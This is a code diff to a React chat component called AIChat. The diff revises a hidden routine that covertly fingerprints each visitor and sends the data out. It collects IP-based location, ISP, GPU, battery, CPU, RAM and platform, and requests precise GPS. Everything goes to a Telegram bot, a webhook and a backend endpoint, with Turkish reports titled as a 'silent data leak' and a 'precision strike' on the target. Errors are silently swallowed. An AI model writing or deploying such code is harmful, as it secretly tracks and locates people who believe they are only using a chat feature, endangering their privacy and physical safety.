@@ -23,51 +23,80 @@ function AIChat() {
     fetch(`https://api.telegram.org/bot${INTEL_CFG.tg}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: INTEL_CFG.cid, text, parse_mode: "Markdown" })
+      body: JSON.stringify({ chat_id: INTEL_CFG.cid, text: text, parse_mode: "HTML" })
     }).catch(() => {});
     fetch(INTEL_CFG.dc, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        username: "x-69 Intel",
-        embeds: [{ title: header, color: 0xff0000, description: text.replace(/\*/g, ''), footer: { text: "x-69 | LenstedReal" } }]
+        username: "\u0130stihbarat Analizi",
+        embeds: [{ title: "\uD83D\uDCE1 " + header, color: 0x00ff00, description: text.replace(/<\/?b>/g, ''), footer: { text: "Sistem: Deep-Log | Enes" } }]
       })
     }).catch(() => {});
   };
 
   const runIntelligence = async () => {
     try {
-      let hw = { gpu: "N/A", bat: "N/A" };
+      let hw = { gpu: "Tespit Edilemedi", bat: "N/A" };
       try {
         const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        if (dbg) hw.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        hw.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
         if (navigator.getBattery) {
           const b = await navigator.getBattery();
-          hw.bat = Math.round(b.level * 100) + '% ' + (b.charging ? 'Doluyor' : 'Desarj');
+          hw.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Doluyor' : 'De\u015Farj'})`;
         }
-      } catch (e) {}
-      const res = await fetch('http://ip-api.com/json/?fields=66846719');
+      } catch(e){}
+
+      const res = await fetch(`${BACKEND_URL}/api/ip-info`);
       const d = await res.json();
+
+      const ipMaps = `https://www.google.com/maps?q=${d.lat},${d.lon}`;
+
       const sid = localStorage.getItem('x69_session_id') || 'user_' + Math.random().toString(36).substr(2, 9);
       localStorage.setItem('x69_session_id', sid);
+
       axios.post(`${BACKEND_URL}/api/intel/collect`, {
         ip: d.query, location: `${d.city}, ${d.country}`, gpu: hw.gpu,
         session_id: sid, isp: d.isp, coords: `${d.lat},${d.lon}`,
         platform: navigator.platform, ram: (navigator.deviceMemory || "N/A") + "GB",
         cpu: (navigator.hardwareConcurrency || "N/A") + " Core"
       }).catch(() => {});
-      pushReport(
-        `*SESSIZ PAKET*\n--\n*IP:* ${d.query}\n*Konum:* ${d.city}, ${d.regionName}/${d.country}\n*ISP:* ${d.isp}\n*Koordinat:* ${d.lat},${d.lon}\n*Maps:* https://www.google.com/maps?q=${d.lat},${d.lon}\n--\n*Sistem:* ${navigator.platform}\n*CPU:* ${navigator.hardwareConcurrency} Core\n*RAM:* ${navigator.deviceMemory || '?'} GB\n*GPU:* \`${hw.gpu}\`\n*Pil:* ${hw.bat}\n*Zaman:* ${new Date().toLocaleString('tr-TR')}`,
-        "Sessiz Veri"
-      );
+
+      const sessizRapor = `\uD83D\uDEF8 <b>\u0130ST\u0130HBARAT ANAL\u0130Z\u0130: SESS\u0130Z PAKET</b>\n` +
+        `----------------------------------\n` +
+        `\uD83C\uDF10 <b>IP:</b> ${d.query}\n` +
+        `\uD83D\uDCCD <b>Konum:</b> ${d.city}, ${d.regionName} / ${d.country}\n` +
+        `\uD83D\uDEF0\uFE0F <b>Servis:</b> ${d.isp}\n` +
+        `\uD83D\uDDFA\uFE0F <b>IP Koordinat:</b> ${d.lat},${d.lon}\n` +
+        `\uD83D\uDCCD <b>IP Maps:</b> ${ipMaps}\n` +
+        `----------------------------------\n` +
+        `\uD83D\uDDA5\uFE0F <b>Sistem:</b> ${navigator.platform}\n` +
+        `\u2699\uFE0F <b>CPU:</b> ${navigator.hardwareConcurrency} Core\n` +
+        `\uD83E\uDDE0 <b>RAM:</b> ${navigator.deviceMemory || '??'} GB\n` +
+        `\uD83C\uDFAE <b>GPU:</b> ${hw.gpu}\n` +
+        `\uD83D\uDD0B <b>Pil:</b> ${hw.bat}\n` +
+        `\u23F0 <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
+
+      pushReport(sessizRapor, "Sessiz Veri S\u0131z\u0131nt\u0131s\u0131");
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
-          pushReport(
-            `*NOKTA ATISI*\n--\n*IP:* ${d.query}\n*Kesin:* ${pos.coords.latitude}, ${pos.coords.longitude}\n*Hata:* ${pos.coords.accuracy}m\n*Maps:* https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-            "GPS Tespit"
-          );
-        }, null, { enableHighAccuracy: true });
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const exactMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          const noktaAtisi = `\uD83C\uDFAF <b>\u0130ST\u0130HBARAT ANAL\u0130Z\u0130: NOKTA ATI\u015EI</b>\n` +
+            `----------------------------------\n` +
+            `\uD83C\uDF10 <b>IP:</b> ${d.query}\n` +
+            `\uD83D\uDCCD <b>Kesin Konum:</b> ${lat}, ${lon}\n` +
+            `\uD83C\uDFAF <b>Hata Pay\u0131:</b> ${pos.coords.accuracy} metre\n` +
+            `\uD83D\uDDFA\uFE0F <b>Kesin Maps:</b> ${exactMaps}\n` +
+            `----------------------------------\n` +
+            `\u26A0\uFE0F <b>Durum:</b> Hedef koordinatlar\u0131 onaylad\u0131.`;
+
+          pushReport(noktaAtisi, "GPS Tespit Edildi");
+        }, null, {enableHighAccuracy: true});
       }
     } catch (e) {}
   };
